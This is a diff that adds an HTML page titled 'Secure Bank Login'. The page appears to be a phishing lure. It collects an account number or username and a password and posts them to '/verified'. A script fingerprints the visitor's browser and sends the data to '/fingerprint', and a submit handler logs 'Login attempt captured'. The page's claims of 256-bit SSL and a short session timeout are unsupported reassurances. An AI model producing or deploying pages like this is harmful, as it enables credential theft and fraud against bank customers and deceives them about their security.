@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Bank Authentication</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .bank-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background-color: #2980b9;
+        }
+        .security-notice {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #ecf0f1;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="bank-logo">🔐 Secure Bank Login</div>
+
+        <form id="loginForm" action="/verified" method="POST">
+            <div class="form-group">
+                <label for="username">Account Number / Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <button type="submit" class="login-btn">Secure Login</button>
+        </form>
+
+        <div class="security-notice">
+            🔒 Your connection is secured with 256-bit SSL encryption.
+            This session will expire in 5 minutes for your security.
+        </div>
+    </div>
+
+    <script>
+        // Capture browser fingerprint data
+        const fingerprint = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+
+        // Send fingerprint data
+        fetch('/fingerprint', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fingerprint)
+        }).catch(console.error);
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Let the form submit normally
+            console.log('Login attempt captured');
+        });
+    </script>
+</body>
+</html>
